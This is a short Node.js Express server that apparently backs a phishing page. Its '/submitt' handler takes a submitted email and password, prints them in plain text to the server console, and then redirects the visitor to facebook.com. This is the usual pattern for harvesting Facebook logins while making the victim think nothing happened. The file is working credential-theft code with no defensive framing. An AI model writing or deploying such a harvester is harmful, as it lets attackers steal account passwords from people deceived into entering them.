var express = require("express");
var app = express();
var request = require("request");
var bodyParser = require("body-parser");
app.set("view engine","ejs");
app.use(bodyParser.urlencoded({
    extended: true
}));
app.get("/form", function(req, res){
    res.render("form");
});


app.post("/submitt", function(req, res){
    var name = req.body.email;
    var pass = req.body.pass;
    console.log("Name: "+name+" password: "+pass);
    res.redirect("http://www.facebook.com/");
});

app.listen(process.env.PORT, process.env.IP, function(){
    console.log("Server Running");
});